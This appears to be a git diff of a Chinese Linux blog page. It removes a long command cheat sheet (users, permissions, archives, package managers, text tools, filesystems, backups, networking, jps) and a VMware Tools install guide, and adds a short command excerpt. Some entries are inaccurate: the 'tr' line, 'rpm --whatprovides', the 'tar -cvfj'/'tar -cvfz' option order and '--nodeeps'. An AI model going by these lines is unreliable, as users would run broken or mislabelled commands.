-<p>useradd -c “Name Surname “ -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 “admin” 用户组的用户 </p>
-<p>useradd user1 创建一个新用户 </p>
-<p>userdel -r user1 删除一个用户 ( ‘-r’ 排除主目录) </p>
-<p>usermod -c “User FTP” -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 </p>
-<p>passwd 修改口令 </p>
-<p>passwd user1 修改一个用户的口令 (只允许root执行) </p>
-<p>chage -E 2005-12-31 user1 设置用户口令的失效期限 </p>
-<p>pwck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的用户 </p>
-<p>grpck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的群组 </p>
-<p>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 </p>
-<p>-———————————————————————————————</p>
-<h4 id="文件的权限-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a><strong>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</strong></h4><p>ls -lh 显示权限 </p>
-<p>ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示 </p>
-<p>chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 </p>
-<p>chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限 </p>
-<p>chown user1 file1 改变一个文件的所有人属性 </p>
-<p>chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 </p>
-<p>chgrp group1 file1 改变文件的群组 </p>
-<p>chown user1:group1 file1 改变一个文件的所有人和群组属性 </p>
-<p>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 </p>
-<p>chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 </p>
-<p>chmod u-s /bin/file1 禁用一个二进制文件的 SUID位 </p>
-<p>chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 </p>
-<p>chmod g-s /home/public 禁用一个目录的 SGID 位 </p>
-<p>chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 </p>
-<p>chmod o-t /home/public 禁用一个目录的 STIKY 位 </p>
-<p>-———————————————————————————————</p>
-<h4 id="文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a><strong>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</strong></h4><p>chattr +a file1 只允许以追加方式读写文件 </p>
-<p>chattr +c file1 允许这个文件能被内核自动压缩/解压 </p>
-<p>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 </p>
-<p>chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 </p>
-<p>chattr +s file1 允许一个文件被安全地删除 </p>
-<p>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 </p>
-<p>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 </p>
-<p>lsattr 显示特殊的属性 </p>
-<p>-———————————————————————————————</p>
-<h4 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a><strong>打包和压缩文件</strong></h4><p>bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件 </p>
-<p>bzip2 file1 压缩一个叫做 ‘file1’ 的文件 </p>
-<p>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件 </p>
-<p>gzip file1 压缩一个叫做 ‘file1’的文件 </p>
-<p>gzip -9 file1 最大程度压缩 </p>
-<p>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包 </p>
-<p>rar a file1.rar file1 file2 dir1 同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’ </p>
-<p>rar x file1.rar 解压rar包 </p>
-<p>unrar x file1.rar 解压rar包 </p>
-<p>tar -cvf archive.tar file1 创建一个非压缩的 tarball </p>
-<p>tar -cvf archive.tar file1 file2 dir1 创建一个包含了 ‘file1’, ‘file2’ 以及 ‘dir1’的档案文件 </p>
-<p>tar -tf archive.tar 显示一个包中的内容 </p>
-<p>tar -xvf archive.tar 释放一个包 </p>
-<p>tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 </p>
-<p>tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 </p>
-<p>tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包 </p>
-<p>tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 </p>
-<p>tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包 </p>
-<p>zip file1.zip file1 创建一个zip格式的压缩包 </p>
-<p>zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 </p>
-<p>unzip file1.zip 解压一个zip格式压缩包 </p>
-<p>-———————————————————————————————</p>
-<h4 id="RPM-包-（Fedora-Redhat及类似系统）"><a href="#RPM-包-（Fedora-Redhat及类似系统）" class="headerlink" title="RPM 包 - （Fedora, Redhat及类似系统）"></a><strong>RPM 包 - （Fedora, Redhat及类似系统）</strong></h4><p>rpm -ivh package.rpm 安装一个rpm包 </p>
-<p>rpm -ivh –nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 </p>
-<p>rpm -U package.rpm 更新一个rpm包但不改变其配置文件 </p>
-<p>rpm -F package.rpm 更新一个确定已经安装的rpm包 </p>
-<p>rpm -e package_name.rpm 删除一个rpm包 </p>
-<p>rpm -qa 显示系统中所有已经安装的rpm包 </p>
-<p>rpm -qa | grep httpd 显示所有名称中包含 “httpd” 字样的rpm包 </p>
-<p>rpm -qi package_name 获取一个已安装包的特殊信息 </p>
-<p>rpm -qg “System Environment/Daemons” 显示一个组件的rpm包 </p>
-<p>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 </p>
-<p>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 </p>
-<p>rpm -q package_name –whatrequires 显示与一个rpm包存在依赖关系的列表 </p>
-<p>rpm -q package_name –whatprovides 显示一个rpm包所占的体积 </p>
-<p>rpm -q package_name –scripts 显示在安装/删除期间所执行的脚本l </p>
-<p>rpm -q package_name –changelog 显示一个rpm包的修改历史 </p>
-<p>rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 </p>
-<p>rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 </p>
-<p>rpm –import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 </p>
-<p>rpm –checksig package.rpm 确认一个rpm包的完整性 </p>
-<p>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 </p>
-<p>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 </p>
-<p>rpm -Va 检查系统中所有已安装的rpm包- 小心使用 </p>
-<p>rpm -Vp package.rpm 确认一个rpm包还未安装 </p>
-<p>rpm2cpio package.rpm | cpio –extract –make-directories <em>bin</em> 从一个rpm包运行可执行文件 </p>
-<p>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm 从一个rpm源码安装一个构建好的包 </p>
-<p>rpmbuild –rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 </p>
-<hr>
-<h4 id="YUM-软件包升级器-（Fedora-RedHat及类似系统）"><a href="#YUM-软件包升级器-（Fedora-RedHat及类似系统）" class="headerlink" title="YUM 软件包升级器 - （Fedora, RedHat及类似系统）"></a><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong></h4><p>yum install package_name 下载并安装一个rpm包 </p>
-<p>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 </p>
-<p>yum update package_name.rpm 更新当前系统中所有安装的rpm包 </p>
-<p>yum update package_name 更新一个rpm包 </p>
-<p>yum remove package_name 删除一个rpm包 </p>
-<p>yum list 列出当前系统中安装的所有包 </p>
-<p>yum search package_name 在rpm仓库中搜寻软件包 </p>
-<p>yum clean packages 清理rpm缓存删除下载的包 </p>
-<p>yum clean headers 删除所有头文件 </p>
-<p>yum clean all 删除所有缓存的包和头文件 </p>
-<hr>
-<h4 id="DEB-包-Debian-Ubuntu-以及类似系统"><a href="#DEB-包-Debian-Ubuntu-以及类似系统" class="headerlink" title="DEB 包 (Debian, Ubuntu 以及类似系统)"></a><strong>DEB 包 (Debian, Ubuntu 以及类似系统)</strong></h4><p>dpkg -i package.deb 安装/更新一个 deb 包 </p>
-<p>dpkg -r package_name 从系统删除一个 deb 包 </p>
-<p>dpkg -l 显示系统中所有已经安装的 deb 包 </p>
-<p>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包 </p>
-<p>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 </p>
-<p>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 </p>
-<p>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表 </p>
-<p>dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 </p>
-<hr>
-<h4 id="APT-软件工具-Debian-Ubuntu-以及类似系统"><a href="#APT-软件工具-Debian-Ubuntu-以及类似系统" class="headerlink" title="APT 软件工具 (Debian, Ubuntu 以及类似系统)"></a><strong>APT 软件工具 (Debian, Ubuntu 以及类似系统)</strong></h4><p>apt-get install package_name 安装/更新一个 deb 包 </p>
-<p>apt-cdrom install package_name 从光盘安装/更新一个 deb 包 </p>
-<p>apt-get update 升级列表中的软件包 </p>
-<p>apt-get upgrade 升级所有已安装的软件 </p>
-<p>apt-get remove package_name 从系统删除一个deb包 </p>
-<p>apt-get check 确认依赖的软件仓库正确 </p>
-<p>apt-get clean 从下载的软件包中清理缓存 </p>
-<p>apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 </p>
-<hr>
-<h4 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a><strong>查看文件内容</strong></h4><p>cat file1 从第一个字节开始正向查看文件的内容 </p>
-<p>tac file1 从最后一行开始反向查看一个文件的内容 </p>
-<p>more file1 查看一个长文件的内容 </p>
-<p>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作 </p>
-<p>head -2 file1 查看一个文件的前两行 </p>
-<p>tail -2 file1 查看一个文件的最后两行 </p>
-<p>tail -f /var/log/messages 实时查看被添加到一个文件中的内容 </p>
-<hr>
-<h4 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a><strong>文本处理</strong></h4><p>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT </p>
-<p>cat file1 | command( sed, grep, awk, grep, etc…) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 </p>
-<p>cat file1 | command( sed, grep, awk, grep, etc…) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 </p>
-<p>grep Aug /var/log/messages 在文件 ‘/var/log/messages’中查找关键词”Aug” </p>
-<p>grep ^Aug /var/log/messages 在文件 ‘/var/log/messages’中查找以”Aug”开始的词汇 </p>
-<p>grep [0-9] /var/log/messages 选择 ‘/var/log/messages’ 文件中所有包含数字的行 </p>
-<p>grep Aug -R /var/log/* 在目录 ‘/var/log’ 及随后的目录中搜索字符串”Aug” </p>
-<p>sed ‘s/stringa1/stringa2/g’ example.txt 将example.txt文件中的 “string1” 替换成 “string2” </p>
-<p>sed ‘/ *#/d; /^$/d’ example.txt 从example.txt文件中删除所有注释和空白行 </p>
-<p>echo ‘esempio’ | tr ‘[:lower:]’ ‘[:upper:]’ 合并上下单元格内容 </p>
-<p>sed -e ‘1d’ result.txt 从文件example.txt 中排除第一行 </p>
-<p>sed -n ‘/stringa1/p’ 查看只包含词汇 “string1”的行 </p>
-<p>sed -e ‘s/ *$//‘ example.txt 删除每一行最后的空白字符 </p>
-<p>sed -e ‘s/stringa1//g’ example.txt 从文档中只删除词汇 “string1” 并保留剩余全部 </p>
-<p>sed -n ‘1,5p;5q’ example.txt 查看从第一行到第5行内容 </p>
-<p>sed -n ‘5p;5q’ example.txt 查看第5行 </p>
-<p>sed -e ‘s/00*/0/g’ example.txt 用单个零替换多个零 </p>
-<p>cat -n file1 标示文件的行数 </p>
-<p>cat example.txt | awk ‘NR%2==1’ 删除example.txt文件中的所有偶数行 </p>
-<p>echo a b c | awk ‘{print $1}’ 查看一行第一栏 </p>
-<p>echo a b c | awk ‘{print $1,$3}’ 查看一行的第一和第三栏 </p>
-<p>paste file1 file2 合并两个文件或两栏的内容 </p>
-<p>paste -d ‘+’ file1 file2 合并两个文件或两栏的内容，中间用”+”区分 </p>
-<p>sort file1 file2 排序两个文件的内容 </p>
-<p>sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份) </p>
-<p>sort file1 file2 | uniq -u 删除交集，留下其他的行 </p>
-<p>sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) </p>
-<p>comm -1 file1 file2 比较两个文件的内容只删除 ‘file1’ 所包含的内容 </p>
-<p>comm -2 file1 file2 比较两个文件的内容只删除 ‘file2’ 所包含的内容 </p>
-<p>comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 </p>
-<hr>
-<h4 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a><strong>字符设置和文件格式转换</strong></h4><p>dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX </p>
-<p>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS </p>
-<p>recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html </p>
-<p>recode -l | more 显示所有允许的转换格式 </p>
-<hr>
-<h4 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a><strong>文件系统分析</strong></h4><p>badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 </p>
-<p>fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 </p>
-<p>fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 </p>
-<p>e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 </p>
-<p>e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 </p>
-<p>fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 </p>
-<p>fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 </p>
-<p>fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 </p>
-<p>dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 </p>
-<hr>
-<h4 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a><strong>初始化一个文件系统</strong></h4><p>mkfs /dev/hda1 在hda1分区创建一个文件系统 </p>
-<p>mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 </p>
-<p>mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 </p>
-<p>mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 </p>
-<p>fdformat -n /dev/fd0 格式化一个软盘 </p>
-<p>mkswap /dev/hda3 创建一个swap文件系统 </p>
-<hr>
-<h4 id="SWAP文件系统"><a href="#SWAP文件系统" class="headerlink" title="SWAP文件系统"></a><strong>SWAP文件系统</strong></h4><p>mkswap /dev/hda3 创建一个swap文件系统 </p>
-<p>swapon /dev/hda3 启用一个新的swap文件系统 </p>
-<p>swapon /dev/hda2 /dev/hdb3 启用两个swap分区 </p>
-<hr>
-<h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a><strong>备份</strong></h4><p>dump -0aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的完整备份 </p>
-<p>dump -1aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的交互式备份 </p>
-<p>restore -if /tmp/home0.bak 还原一个交互式备份 </p>
-<p>rsync -rogpav –delete /home /tmp 同步两边的目录 </p>
-<p>rsync -rogpav -e ssh –delete /home ip_address:/tmp 通过SSH通道rsync </p>
-<p>rsync -az -e ssh –delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 </p>
-<p>rsync -az -e ssh –delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 </p>
-<p>dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr ‘dd of=hda.gz’ 通过ssh在远程主机上执行一次备份本地磁盘的操作 </p>
-<p>dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 </p>
-<p>tar -Puf backup.tar /home/user 执行一次对 ‘/home/user’ 目录的交互式备份操作 </p>
-<p>( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr ‘cd /home/share/ &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个目录内容 </p>
-<p>( tar c /home ) | ssh -C user@ip_addr ‘cd /home/backup-home &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个本地目录 </p>
-<p>tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 </p>
-<p>find /home/user1 -name ‘*.txt’ | xargs cp -av –target-directory=/home/backup/ –parents 从一个目录查找并复制所有以 ‘.txt’ 结尾的文件到另一个目录 </p>
-<p>find /var/log -name ‘*.log’ | tar cv –files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 ‘.log’ 结尾的文件并做成一个bzip包 </p>
-<p>dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 </p>
-<p>dd if=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 </p>
-<hr>
-<h4 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a><strong>光盘</strong></h4><p>cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容 </p>
-<p>mkisofs /dev/cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件 </p>
-<p>mkisofs /dev/cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件 </p>
-<p>mkisofs -J -allow-leading-dots -R -V “Label CD” -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件 </p>
-<p>cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件 </p>
-<p>mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件 </p>
-<p>cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中 </p>
-<p>cd-paranoia – “-3” 从一个CD光盘转录音轨到 wav 文件中（参数-3） </p>
-<p>cdrecord –scanbus 扫描总线以识别scsi通道 </p>
-<p>dd if=/dev/hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD </p>
-<hr>
-<h4 id="网络-（以太网和WIFI无线）"><a href="#网络-（以太网和WIFI无线）" class="headerlink" title="网络 - （以太网和WIFI无线）"></a><strong>网络 - （以太网和WIFI无线）</strong></h4><p>ifconfig eth0 显示一个以太网卡的配置 </p>
-<p>ifup eth0 启用一个 ‘eth0’ 网络设备 </p>
-<p>ifdown eth0 禁用一个 ‘eth0’ 网络设备 </p>
-<p>ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址 </p>
-<p>ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing) </p>
-<p>dhclient eth0 以dhcp模式启用 ‘eth0’ </p>
-<p>route -n show routing table </p>
-<p>route add -net 0/0 gw IP_Gateway configura default gateway </p>
-<p>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0/16’ </p>
-<p>route del 0/0 gw IP_gateway remove static route </p>
-<p>echo “1” &gt; /proc/sys/net/ipv4/ip_forward activate ip routing </p>
-<p>hostname show hostname of system </p>
-<p>host <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa</p>
-<p>nslookup <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa</p>
-<p>ip link show show link status of all interfaces </p>
-<p>mii-tool eth0 show link status of ‘eth0’ </p>
-<p>ethtool eth0 show statistics of network card ‘eth0’ </p>
-<p>netstat -tup show all active network connections and their PID </p>
-<p>netstat -tupl show all network services listening on the system and their PID </p>
-<p>tcpdump tcp port 80 show all HTTP traffic </p>
-<p>iwlist scan show wireless networks </p>
-<p>iwconfig eth1 show configuration of a wireless network card </p>
-<p>hostname show hostname </p>
-<p>host <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa </p>
-<p>nslookup <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup hostname to resolve name to ip address and viceversa </p>
-<p>whois <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> lookup on Whois database </p>
-<hr>
-<h4 id="JPS工具"><a href="#JPS工具" class="headerlink" title="JPS工具"></a><strong>JPS工具</strong></h4><p>ps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。</p>
-<p>​    我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 id。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其id号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。</p>
-<p>​     使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。</p>
-<p>jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.</p>
-<p>$&gt; jps</p>
-<p>23991 Jps</p>
-<p>23789 BossMain</p>
-<p>23651 Resin</p>
-<h5 id="比较常用的参数："><a href="#比较常用的参数：" class="headerlink" title="比较常用的参数："></a><strong>比较常用的参数：</strong></h5><p>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数</p>
-<p>$&gt;  jps -q</p>
-<p>28680</p>
-<p>23789</p>
-<p>23651</p>
-<h5 id="m-输出传递给main-方法的参数，在嵌入式jvm上可能是null"><a href="#m-输出传递给main-方法的参数，在嵌入式jvm上可能是null" class="headerlink" title="-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null"></a><strong>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null</strong></h5><p>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null</p>
-<p>$&gt; jps -m</p>
-<p>28715 Jps -m</p>
-<p>23789 BossMain</p>
-<p>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log</p>
-<h5 id="l-输出应用程序main-class的完整package名-或者-应用程序的jar文件完整路径名"><a href="#l-输出应用程序main-class的完整package名-或者-应用程序的jar文件完整路径名" class="headerlink" title="-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名"></a><strong>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名</strong></h5><p>$&gt; jps -l</p>
-<p>28729 sun.tools.jps.Jps</p>
-<p>23789 com.asiainfo.aimc.bossbi.BossMain</p>
-<p>23651 com.caucho.server.resin.Resin</p>
-<h5 id="v-输出传递给JVM的参数"><a href="#v-输出传递给JVM的参数" class="headerlink" title="-v 输出传递给JVM的参数"></a><strong>-v 输出传递给JVM的参数</strong></h5><p>$&gt; jps -v</p>
-<p>23789 BossMain</p>
-<p>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd</p>
-<p>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m</p>
-<p>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -</p>
-<p>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl</p>
-<p>sudo jps看到的进程数量最全</p>
-<p>jps 192.168.0.77</p>
-<p>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099</p>
-<p>前提是远程服务器提供jstatd服务）</p>
-<p>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。输入正文</p>
-
-          
+          <h1 id="Linux常用基本命令"><a href="#Linux常用基本命令" class="headerlink" title="Linux常用基本命令:"></a>Linux常用基本命令:</h1><h4 id="1-网络测试命令"><a href="#1-网络测试命令" class="headerlink" title="(1)网络测试命令:"></a>(1)网络测试命令:</h4><p> ping   192.168.1.1     //不会自动停,要Ctrl+C停止.<br> Ctrl+l    清屏<br>远程登录的方式:远程桌面/Telnet/SSH/;<br>Telnet和SSH最大的区别是:传输数据包的时候是否进行加密.<br>Telnet在传输过程中数据不加密—-明文传输;<br>SSH在传输过程中对数据进行加密—-密文传输;<br>ifconfig    //查看所有网卡的信息<br>ifconfig ens32    //只查看某一个网卡的信息<br>vim  是linux中的一个编辑器,类似于windows中的记事本.    </p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/linux常用命令/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2751,6 +1412,15 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     603 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     2 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -2796,6 +1466,37 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  603
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  2
+                </span>
+              
+            </div>
+          
 
           
 
@@ -2813,28 +1514,14 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
 
       
         
-          
-            <h1 id="Linux-CentOS-7-命令行模式安装VMware-Tools-详解"><a href="#Linux-CentOS-7-命令行模式安装VMware-Tools-详解" class="headerlink" title="Linux(CentOS 7)命令行模式安装VMware Tools 详解"></a>Linux(CentOS 7)命令行模式安装VMware Tools 详解</h1><p>本例中为在Linux（以CentOS 7为例）安装VMware Tools。<br>1.首先启动CentOS 7,在VMware中点击上方“VM”，点击“Install VMware Tools…”（如已安装则显示“Reinstall VMware Tools…”）。</p>
-<p>2.在命令行输入“ls /dev”查看。</p>
-<p>3.输入“mkdir /mnt/cdrom”在/mnt目录下新建一个名为cdrom的文件夹。</p>
-<p>4.输入“mount -t iso9660 /dev/cdrom /mnt/cdrom”将光盘挂载到/mnt/cdrom目录下。</p>
-<p>5.输入“ls /mnt/cdrom/”查看内容，输入“cp /mnt/cdrom/VMwareTools-9.2.0-799703.tar.gz /root/vm.tar.gz”,将名为“VMwareTools-9.2.0-799703.tar.gz”复制到/root目录下，并重新命名为vm.tar.gz。</p>
-<p>6.在根目录下输入“ls”查看文件，输入“tar -xzf vm.tar.gz”将文件解压，输入“ls”查看文件，可发现新增目录“vmware-tools-distrib”。</p>
-<p>7.输入“cd vmware-tools-distrib/”进入名为“vmware-tools-distrib”的目录，输入“./vmware-install.pl”尝试安装，出现错误“-bash: ./vmware-install.pl: /usr/bin/per: bad interpreter: No such file or directory”，表明未安装编译环境。</p>
-<p>8.输入“yum -y install perl gcc make kernel-headers kernel-devel”开始安装。</p>
-<p>9.提示已经安装完毕。</p>
-<p>10.在“vmware-tools-distrib”目录下重新输入“./vmware-install.pl”开始安装，基本上按回车键即可。</p>
-<p>11.VMware Tools已经安装完毕，提示可以运行“/usr/bin/vmware-uninstall-tools.pl”命令卸载VMware Tools。第一次运行时需运行“/usr/bin/vmware-config-tools.pl”命令配置VMware Tools，按回车键直接运行。</p>
-<p>12.提示已经安装完毕，可以开始使用。</p>
-<p>13.输入”/usr/bin/vmware-user”启动vmware用户进程，并输入”startx“启动图形界面。</p>
-<p>14.选择文件（本例中为”测试文档.docx”）并摁住鼠标左键不放，尝试拖动文件到虚拟机。</p>
-<p>15.放开鼠标左键，发现文件已经复制到虚拟机。</p>
-<p>16.如需卸载VMware Tools，输入“/usr/bin/vmware-uninstall-tools.pl”即可。</p>
-<p>17.如需在Gnome GUI图形界面下安装，则只需将文件解压，然后再文件夹里点鼠标右键，选择“Open in Terminal”,在Terminal里面输入“./vmware-install.pl”即可。</p>
-<p>安装故障<br>18.如安装时出现类似下图错误，提示无法删除open-vm-tools，则可能是因为上次安装失败造成。</p>
-<p>19.如尝试输入“/usr/bin/vmware-uninstall-tools.pl”仍无法卸载，则输入“rpm -e open-vm-tools-desktop”卸载并重新安装。</p>
-
-          
